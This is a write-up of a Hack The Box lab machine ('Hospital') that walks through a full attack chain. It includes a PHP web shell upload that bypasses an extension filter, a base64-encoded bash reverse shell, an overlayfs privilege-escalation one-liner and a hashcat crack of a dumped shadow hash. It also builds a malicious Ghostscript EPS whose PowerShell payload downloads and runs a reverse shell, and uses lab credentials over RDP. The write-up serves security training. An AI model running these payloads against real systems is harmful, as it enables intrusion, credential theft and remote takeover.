---
title:  "HTB Hospital Writeup"
date:   2024-04-13 00:30:00 
categories: HTB Machine
tags: ghostscript gameoverlay file_upload selenium
---



![Download](/assets/img/Hospital/F_D4Z-xXYAABRzU.png)

## Introduction


The initial access was a fairly standard file upload vulnerability however this was only the start of the entire chain. Next exploiting the docker container to then abuse the password re-use of one of its users. The most interesting part was the entire exploit related to ghostscript i've never encountered it before and was interesting to learn about.

The privilege escalation was quite straight forward for both the intended and unintended path, The intended path was made quite annoying due to the slowness of the machines.

If you like any of my content it would help a lot if you used my referral link to buy Hack the box/ Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start our recon off we will start with an Nmap scan of the machine. using the following command 
```
sudo nmap -sS -A  -o nmap  10.10.11.241
```
**Nmap**
```
# Nmap 7.94 scan initiated Mon Nov 20 14:16:39 2023 as: nmap -sS -A -o nmap 10.10.11.241
Nmap scan report for 10.10.11.241
Host is up (0.032s latency).
Not shown: 980 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-21 02:16:51Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-21T02:17:46+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2023-09-05T18:39:34
|_Not valid after:  2024-03-06T18:39:34
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 5.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:5.0
Aggressive OS guesses: Linux 5.0 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-21T02:17:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   30.24 ms 10.10.14.1
2   31.51 ms 10.10.11.241

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 20 14:18:27 2023 -- 1 IP address (1 host up) scanned in 108.39 seconds

```

Looking at the output of the Nmap scan i decided to check out the web pages first located at port **443** and port **8080**. The webserver found at port **443** didn't seem interesting at this time because it was just a login portal of which we didn't have any credentials. It was also not vulnerable to SQL injection nor did it have default credentials.

![Hospital webmail](/assets/img/Hospital/Hospital_01.png)


The other web page hosted on port **8080** was more interesting this page allowed us to create an account. After creating the account I saw that the only feature that was present was a file upload. 

![Hospital File upload](/assets/img/Hospital/Hospital_02.png)


### Abusing the file upload
Seeing that the login page was in PHP i tried to upload a php webshell for this example i used the shell created by [WhiteWinterWolf](https://github.com/WhiteWinterWolf/wwwolf-php-webshell). I sent the following request Trying to upload a php webshell.

```
POST /upload.php HTTP/1.1
Host: hospital.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------264972332940092698408409307
Content-Length: 7431
Origin: http://hospital.htb:8080
Connection: close
Referer: http://hospital.htb:8080/index.php
Cookie: PHPSESSID=24dc8cn9ieqmsmji6btnbkasei
Upgrade-Insecure-Requests: 1

-----------------------------264972332940092698408409307

Content-Disposition: form-data; name="image"; filename="Calico.php"

Content-Type: application/x-php

#<?php
/*******************************************************************************
 * Copyright 2017 WhiteWinterWolf

<snipped for brevity>
```
The server then issued the following request showing that our webshell wasn't successfully uploaded. The redirect would direct us to **failed.php**

```
HTTP/1.1 302 Found
Date: Tue, 21 Nov 2023 04:13:49 GMT
Server: Apache/2.4.55 (Ubuntu)
Location: /failed.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

now the first step i always go through when testing out file upload is testing if any of the lesser known formats for the programming language are allowed. if the application uses a blacklist instead of a whitelist approach this could happen. The most common formats for PHP are the following
```
php
php2
php3
php4
php5
php6
php7
phps
phps
pht
phtm
phtml
pgif
shtml
htaccess
phar
inc
hphp
ctp
module
```

To test all these formats rapidly i used the intruder functionality within burpsuite. i used the following request as a base where the extension was being enumerated by the previously mentioned list.

![Burp configuration](/assets/img/Hospital/Hospital_03.png)

Then after running through these payloads we could go through all of the responses. When checking through these responses it became clear that the **phar** format was not blacklisted.

```
POST /upload.php HTTP/1.1
Host: hospital.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------9374035178820981983028419167
Content-Length: 7432
Origin: http://hospital.htb:8080
Connection: keep-alive
Referer: http://hospital.htb:8080/index.php
Cookie: PHPSESSID=24dc8cn9ieqmsmji6btnbkasei
Upgrade-Insecure-Requests: 1

-----------------------------9374035178820981983028419167

Content-Disposition: form-data; name="image"; filename="Calico.phar"
Content-Type: application/x-php

#<?php
/*******************************************************************************
 * Copyright 2017 WhiteWinterWolf
 * https://www.whitewinterwolf.com/tags/php-webshell/
 *
 * This file is part of wwolf-php-webshell.
```

The server then issued the following valid response. The fact we were being redirected to **success.php** was an indication that our file was uploaded

```
HTTP/1.1 302 Found
Date: Tue, 21 Nov 2023 03:51:04 GMT
Server: Apache/2.4.55 (Ubuntu)
Location: /success.php
Content-Length: 0
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

So next step was to try and access this file. I assumed that files would be located in the uploads folder meaning our shell would be at **http://hospital.htb:8080/uploads/Calico.phar**

![Webshell](/assets/img/Hospital/Hospital_04.png)

Next step was to create a full reverse shell. Seeing that we were running as www-data user i was certain it was a linux machine. With the following command i created a bash reverse shell

```
echo -n '/bin/bash -l > /dev/tcp/10.10.14.184/443 0<&1 2>&1' | base64

```

this command gave us the following B64 encoded string 
```
L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMTg0LzQ0MyAwPCYxIDI+JjE=
```

Then using this B64 string our payload will look like this:

```
echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMTg0LzQ0MyAwPCYxIDI+JjE= | base64 --decode | bash
```

After getting the reverse shell we can make our shell a bit cleaner with the following TTY trick in python

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Foothold

### Escalate container privileges

After doing some local linux enumeration using linpeas i noticed that the os version was outdated and should be vulnerable to the fs overlay exploit. For more information on this exploit check the [github page](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main)
```
uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

We can exploit this by executing the following bash commands.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
```
![Root shell](/assets/img/Hospital/Hospital_05.png)



Now with our new root permission within the container we can enumerate the entire system without any restriction. After looking through the file system i noticed that there was a second user hash within the shadow file of **drwilliams**

```
cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
sync:*:19462:0:99999:7:::
games:*:19462:0:99999:7:::
man:*:19462:0:99999:7:::
lp:*:19462:0:99999:7:::
mail:*:19462:0:99999:7:::
news:*:19462:0:99999:7:::
uucp:*:19462:0:99999:7:::
proxy:*:19462:0:99999:7:::
www-data:*:19462:0:99999:7:::
backup:*:19462:0:99999:7:::
list:*:19462:0:99999:7:::
irc:*:19462:0:99999:7:::
_apt:*:19462:0:99999:7:::
nobody:*:19462:0:99999:7:::
systemd-network:!*:19462::::::
systemd-timesync:!*:19462::::::
messagebus:!:19462::::::
systemd-resolve:!*:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
```

We can try to crack this hash using hashcat using the following command

```
hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt
```
After a few moments the hash would be cracked. drwilliams password ended up being **qwe123!@#**

![Cracked hash](/assets/img/Hospital/Hospital_06.png)

### Gaining access to the webmail

So now we have drwilliams password we can try to access the webmail we saw before on port **443**. I was able to access the page using the following credentials

```
username: drwilliams@hospital.htb
password: qwe123!@#
```

When logging into the webmail we could see the following mail. Mentioning that drbrown is expecting an eps file soon.

![Mail](/assets/img/Hospital/Hospital_07.png)

Looking deeper into eps files i found the following publicly known exploit on [github](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection). Basically it is possible to embed commands within eps files that will run whenever these files are opened. I downloaded the tool from github and then made the following payload to put in the eps file.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.184/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.184 -Port 443
```

The payload makes use of the **Invoke-PowerShellTcp.ps1** scripy of [nishang](https://github.com/samratashok/nishang) This github repo contains multiple powershell scripts including reverse shells and other post exploitation tools. next i setup a webserver in the shells directory of the github project using python.

```
python -m http.server 80
```

So now the preparations for our payload were made. Next i generated the eps file using the before mentioned github project. Using the following command it was possible to generate the malicious eps file.

```
python3 CVE_2023_36664_exploit.py --payload "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.184/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.184 -Port 443" --filename medical --extension eps --generate
```

![Send the malicious email](/assets/img/Hospital/Hospital_08.png)

After a few seconds we get a reverse shell as **drbrown**

![Send the malicious email](/assets/img/Hospital/Hospital_09.png)

## Privilege escalation

### unintended

There were two ways to solve this machine the unintended way was to abuse the fact that xampp server commonly runs as system. We could abuse this by uploading a php webshell into the **C:\xampp\htdocs** directory. I uploaded the same php webshell of before using wget.

```
wget http://10.10.14.184/webshell.php -outfile calico12345.php
```

then after uploading the webshell here we could access it with the following url.

```
https://hospital.htb/calico12345.php
```
![Webshell as system](/assets/img/Hospital/Hospital_10.png)


### Intended root

While looking through the file system we could find find a script named **ghostscript.bat** in the documents folder of the drbrown user. Checking this script we could see that this script contained the credentials of **drbrown** in clear text

```powershell
ls
cat ghostscript.bat
```


![Creds of Drbrown](/assets/img/Hospital/Hospital_11.png)

```bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

So now that we know that drbrown's password is **chr!$br0wn** we were able to get an interactive login using rdp

```bash
xfreerdp /u:drbrown /v:10.10.11.241 /p:'chr!$br0wn' /timeout:60000
```

![Loggedin drbrown rdp](/assets/img/Hospital/Hospital_12.png)

When browsing through the system i couldn't see anything special really but then at some point a selenium script pops open and starts to fill in the credentials of the administrator user in the hospital webmail. We were then able to get the credentials from this form.

![Administrator password](/assets/img/Hospital/Hospital_13.png)


Next we used these credentials in with freerdp. After running this command we'd get access to the server as administrative user.

```
xfreerdp /u:Administrator /v:10.10.11.241 /p:'Th3B3stH0sp1t4l9786!' /timeout:60000
```
![Access as admin](/assets/img/Hospital/Hospital_14.png)
